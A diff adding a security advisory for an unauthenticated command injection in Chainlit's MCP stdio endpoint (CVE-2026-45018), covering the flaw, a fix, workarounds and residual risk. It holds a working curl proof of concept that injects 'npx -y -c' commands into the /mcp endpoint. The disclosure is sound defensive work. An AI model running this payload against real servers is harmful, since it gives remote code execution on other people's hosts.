@@ -1,0 +1,112 @@
+# [C] Chainlit has command injection via MCP stdio transport that allows unauthenticated remote code execution
+
+## Summary
+Severity: Critical
+Advisory: GHSA-w3fx-mc44-mf6j
+CVE: CVE-2026-45018
+CWE: CWE-78
+Ecosystem: PyPI
+CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
+Published: 2026-08-25
+Source: https://github.com/advisories/GHSA-w3fx-mc44-mf6j
+Type: github-advisory
+
+## Affected
+- PyPI: `chainlit` — affected >=2.4.0rc0 <2.12.0
+
+## Details
+### Am I affected?
+
+Only if your deployment sets `features.mcp.enabled = true` in `.chainlit/config.toml`. **MCP has been disabled by default since v2.7.0**, so most Chainlit deployments are not affected. No authentication is required: `/mcp` is reachable by any client that can open a session.
+
+### Summary
+
+When MCP is enabled (`features.mcp.enabled = true`), the `POST /mcp` endpoint for `stdio` transport accepts a user-controlled `fullCommand` string. The `validate_mcp_command()` function checks the executable name against a configurable allowlist but does not inspect or restrict the arguments. An attacker can pass `npx -y -c 'ARBITRARY COMMAND'` to execute arbitrary shell commands on the server with the privileges of the Chainlit process.
+
+
+### Affected / patched versions
+
+| | |
+|---|---|
+| CVE | CVE-2026-45018 |
+| Affected | `>=2.4.0rc0, <2.12.0` with `features.mcp.enabled = true` (introduced in PR #1977, the change that added MCP support) |
+| Patched | **2.12.0** (releasing 2026-08-25) |
+
+### Details
+
+`validate_mcp_command()` in `backend/chainlit/mcp.py` uses `shlex.split()` to parse the command string and validates only the executable name (e.g., `npx`, `uvx`) against `config.features.mcp.stdio.allowed_executables`. Arguments are returned unchecked and passed directly to `StdioServerParameters`, which spawns a subprocess.
+
+Since `npx` supports `-c` for arbitrary shell execution, `npx -y -c 'PAYLOAD'` passes the allowlist check while running whatever the attacker specifies. This gives an attacker who can reach the endpoint full control over the host.
+
+There is a related issue in the Pydantic model: `allowed_executables` defaults to `None`, and the validation code treats `None` as "allow everything." If a developer removes the `allowed_executables` line from their config, any executable can be invoked.
+
+The `/mcp` route is registered unconditionally on the FastAPI router in every Chainlit deployment; only the runtime `features.mcp.enabled` check and (where configured) the authentication check on `/mcp` prevent exploitation.
+
+**Vulnerable code:** `backend/chainlit/mcp.py` — `validate_mcp_command()`
+**Sink:** `backend/chainlit/server.py` — `StdioServerParameters`
+
+### PoC
+
+Tested against Chainlit 2.11.0 with `features.mcp.enabled = true` and default settings.
+
+1. Establish a Socket.IO session to get a valid `sessionId`:
+
+```bash
+EIO_SID=$(curl -s 'http://TARGET:8000/ws/socket.io/?EIO=4&transport=polling' \
+  | python3 -c "import sys,json; print(json.loads(sys.stdin.read()[1:])['sid'])")
+
+curl -s -X POST \
+  "http://TARGET:8000/ws/socket.io/?EIO=4&transport=polling&sid=$EIO_SID" \
+  -d '40{"sessionId":"rce-proof","userEnv":"{}","clientType":"webapp"}'
+```
+
+2. Send the command injection payload:
+
+```bash
+curl -s -X POST 'http://TARGET:8000/mcp' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "sessionId": "rce-proof",
+    "clientType": "stdio",
+    "name": "poc",
+    "fullCommand": "npx -y -c '\''id > /tmp/rce_proof'\''"
+  }'
+```
+
+The server runs the command before the MCP handshake fails. The output of id is written to /tmp/rce_proof.
+
+### Impact
+
+**Critical.** An unauthenticated remote attacker can execute arbitrary OS commands on the server with the privileges of the Chainlit process. This can lead to full host compromise, data exfiltration, lateral movement, and installation of persistent backdoors. Any Chainlit deployment with MCP enabled is affected.
+
+### Fix
+
+Chainlit 2.12.0 removes `fullCommand` from the client request entirely. stdio MCP servers are now declared by the developer in `.chainlit/config.toml` under `[[features.mcp.servers]]` and selected by name at connection time; the command string never crosses the trust boundary from client to server, so there is no command left to sanitize and no `allowed_executables` mechanism anymore. Per-server environment variables are configured via an `env` mapping on the server entry rather than supplied by the client.
+
+### Workarounds
+
+If you cannot upgrade immediately:
+
+- Set `features.mcp.enabled = false` in `.chainlit/config.toml`. This fully prevents exploitation of this issue (and of the companion SSRF issue, CVE-2026-45019).
+- Restrict outbound process-spawning / network capability from the host running Chainlit.
+- Configure authentication (register an auth callback) so that `/mcp` requires an authenticated session. This does not fix the underlying command injection, but removes the unauthenticated attack path.
+
+### Upgrading to 2.12.0
+
+> **Breaking change.** 2.12.0 changes how MCP servers are configured. If `.chainlit/config.toml` still uses the legacy `[features.mcp.sse]`, `[features.mcp.stdio]`, or `[features.mcp.streamable-http]` sections, or the `allowed_executables` setting, the application will fail to start **once MCP is enabled**, until you migrate to the new `[[features.mcp.servers]]` configuration. See the migration guide in `CHANGELOG.md` before upgrading. Deployments with `features.mcp.enabled = false` are not affected by this startup check.
+
+### Residual risk after upgrading
+
+- On deployments with no authentication configured, `/mcp` remains reachable anonymously after upgrading, because `get_current_user` returns `None` when no auth callback is registered. An anonymous client can therefore still cause **developer-configured** stdio servers to be spawned by name. Because the command itself is developer-controlled rather than attacker-supplied, this is no longer remote code execution — but it is still unauthenticated process spawning on deployments without authentication.
+- No resource limits are placed on stdio server spawning, and there is no cap on concurrent MCP sessions per client.
+
+### Credits
+
+Vipin <vipin@spl.team>
+SPL <security@spl.team>
+
+## References
+- https://github.com/Chainlit/chainlit/security/advisories/GHSA-w3fx-mc44-mf6j
+- https://github.com/Chainlit/chainlit/commit/0565fd0eccb915fce159929598b053ed79f6e0c9
+- https://github.com/Chainlit/chainlit
+- https://github.com/Chainlit/chainlit/releases/tag/2.12.0
